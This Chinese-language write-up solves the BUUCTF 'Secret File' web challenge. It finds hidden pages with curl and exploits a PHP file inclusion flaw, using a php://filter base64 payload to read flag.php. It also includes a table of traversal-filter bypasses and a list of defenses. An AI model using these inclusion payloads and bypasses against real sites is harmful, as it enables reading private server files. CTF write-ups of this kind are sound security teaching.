---
title: 3-Secret File - PHP文件包含漏洞
date: 2026-05-02
categories:
  - BUUCTF
  - WEB
tags:
  - php代码审计
  - CTF
---

# Secret File - PHP文件包含漏洞

## 题目信息
- **题目类型**: Web - PHP文件包含
- **题目地址**: http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/

## 解题过程

### 第一步：信息收集

首先访问主页，发现是一个简单的页面，提示"你想知道蒋璐源的秘密么？"

```bash
curl -s http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/
```

查看页面源代码，发现有一个隐藏的链接指向 `./Archive_room.php`

### 第二步：探索隐藏链接

访问 `Archive_room.php`，发现有一个SECRET按钮，链接到 `action.php`

```bash
curl -s http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/Archive_room.php
```

### 第三步：发现源码泄露

访问 `action.php` 时，虽然页面会302跳转到 `end.php`，但查看源代码发现了关键线索：

```bash
curl -s http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/action.php
```

返回的HTML注释中暴露了 `secr3t.php`：
```html
<!--
   secr3t.php        
-->
```

### 第四步：获取关键源码

访问 `secr3t.php`，获得了关键源码：

```bash
curl -s http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/secr3t.php
```

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
```

### 第五步：利用文件包含漏洞

源码中存在文件包含漏洞，过滤了以下内容：
- `../` - 目录遍历
- `tp` - 阻止 `php://` 协议
- `input` - 阻止 `php://input`
- `data` - 阻止 `data://` 协议

**绕过方法**：使用 `php://filter` 伪协议读取文件（注意`php://filter`不包含被过滤的字符串）

```bash
curl -s "http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php"
```

返回base64编码的flag.php源码：
```
PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4K...（省略）
```

### 第六步：解码获取Flag

```bash
echo 'PCFET0NUWVBFIGh0bWw+...' | base64 -d
```

解码后得到flag.php的完整源码，其中包含：
```php
$flag = 'flag{1ff51255-f733-4b89-8dbc-98cae1493181}';
```

## 最终Flag

```
flag{1ff51255-f733-4b89-8dbc-98cae1493181}
```

## 知识点总结

### 1. PHP文件包含漏洞 (LFI/RFI)
- **LFI (Local File Inclusion)**: 本地文件包含，可以读取服务器上的任意文件
- **RFI (Remote File Inclusion)**: 远程文件包含，可以包含远程服务器上的文件（需要allow_url_include开启）

### 2. PHP伪协议
- **php://filter**: 用于读取和过滤数据流
  - `read=convert.base64-encode`: 将文件内容base64编码后输出
  - `resource=文件名`: 指定要读取的文件
  
  示例：
  ```
  php://filter/read=convert.base64-encode/resource=flag.php
  ```

- **php://input**: 可以访问原始的POST数据
- **data://**: 可以执行内嵌的PHP代码

### 3. 常见过滤绕过
| 过滤字符串 | 绕过方法 |
|-----------|---------|
| `../` | `....//`、`..%2f..%2f`、`%2e%2e/` |
| `php://` | 使用 `php://filter`（不含被过滤字符时） |
| `data` | 使用其他协议 |

### 4. 信息收集技巧
- 查看页面源代码（隐藏链接、注释信息）
- 查看HTTP响应头（可能暴露版本信息）
- 访问常见文件（robots.txt、.git、.svn等）
- 使用Burp Suite等工具拦截请求

### 5. 常用命令
```bash
# 查看页面内容
curl -s URL

# 查看HTTP响应头
curl -sI URL

# Base64解码
echo 'base64字符串' | base64 -d

# URL编码
echo -n '../' | xxd -plain | tr -d '\n' | sed 's/../%&/g'
```

## 防御措施
1. 避免直接使用用户输入作为文件包含的参数
2. 使用白名单机制，只允许包含指定的文件
3. 关闭危险配置：`allow_url_include = Off`
4. 使用`realpath()`函数验证文件路径
5. 对输入进行严格的过滤和验证

## 参考链接
- [PHP手册 - 支持的协议和封装协议](https://www.php.net/manual/zh/wrappers.php)
- [CTF Wiki - 文件包含](https://ctf-wiki.org/web/php/include/)
